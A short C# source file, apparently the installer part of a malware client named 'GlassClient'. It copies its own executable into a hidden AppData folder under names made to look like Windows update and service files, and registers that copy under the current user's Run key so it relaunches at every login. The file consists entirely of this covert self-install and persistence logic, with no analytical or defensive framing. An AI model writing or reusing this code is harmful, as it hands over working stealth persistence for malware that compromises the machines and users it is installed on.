﻿using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Text;
using System.Windows.Forms;

namespace GlassClient
{
    public class GlassInstaller
    {
        public const string APP_NAME = "Win32Svrc";

        public void Install()
        {
            string destPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\WinUpdater32";
            string filePath = destPath + "\\Win32Srvc.exe";
            if (!Directory.Exists(destPath))
            {
                Directory.CreateDirectory(destPath);
                File.Copy(Assembly.GetEntryAssembly().Location, filePath);
                File.SetAttributes(filePath, FileAttributes.Hidden);
                RegistryKey add = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
                add.SetValue(APP_NAME, "\"" + filePath + "\"");
            }
        }
    }
}
